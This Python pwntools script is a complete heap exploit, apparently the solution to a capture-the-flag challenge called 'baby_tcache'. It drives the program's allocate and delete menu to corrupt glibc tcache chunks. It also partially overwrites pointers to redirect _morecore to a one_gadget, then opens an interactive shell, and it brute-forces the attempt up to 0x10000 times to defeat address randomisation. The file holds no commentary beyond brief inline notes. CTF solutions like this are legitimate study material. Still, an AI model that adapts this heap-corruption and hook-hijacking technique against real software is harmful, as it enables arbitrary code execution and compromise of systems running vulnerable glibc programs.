from pwn import *

def make(size, content):
    r.sendlineafter('choice: ', '1')
    r.sendlineafter('Size:', str(size))
    r.sendafter('Data:', content)

def delete(idx):
    r.sendlineafter('choice: ', '2')
    r.sendlineafter('Index:', str(idx))

def quit():
    r.sendlineafter('choice: ', '3')

def exploit(r):
    for _ in xrange(7):
        make(0x200, 'a') # 0 ~ 6

    make(0x900, 'a') # 7
    make(0x4f0, 'barrier') # 8

    delete(7)

    make(0x8d0, 'a') # 7
    make(0x20, 'a') # 9

    delete(7)
    delete(9)

    make(0x28, 'a'*0x28) # 7

    for _ in xrange(8):
        delete(7)
        make(0x27-_, 'a'*(0x27-_))

    delete(7)
    make(0x22, 'a'*0x20+'\x10\x09') # 7
    delete(8)
    make(0x8d0, 'a') # 8
    make(0x20, 'a') # 9

    for _ in xrange(7):
        delete(_)

    make(0x900, 'libc') # 0
    make(0x500, 'barrier') # 1

    delete(0)
    delete(7)
    delete(9)

    make(0x20, '\xe0') # 0
    make(0x900, '\xd8\x24') # 2, _morecore
    make(0x20, '\xe0') # 3
    make(0x20, 'dummy') # 4
    make(0x20, '\x8c\x03\xb5') # 5, one_gadget

    delete(8)
    delete(0)
    delete(1)

    def heap(size):# for using top chunk
        for _ in xrange(6):
            make(size, 'a')
        delete(0)
        delete(1)
        delete(6)
        delete(7)
        delete(8)
        delete(9)

    for i in xrange(8):
        heap(0x210+16*i)

    for i in xrange(16):
        heap(0x310+16*i)

    make(0x2000, 'a')
    r.sendlineafter('choice: ', '1')
    r.sendlineafter('Size:', str(0x2000)) # trigger _morecore

    # for cases which don't die even if this cannot get shell
    r.sendline('3')
    r.sendline('3')
    r.sendline('3')

    r.interactive()

for _ in xrange(0x10000):
    r = ''
    try:
        r = process('./baby_tcache')
        exploit(r)
        exit()
    except:
        r.close()
        continue

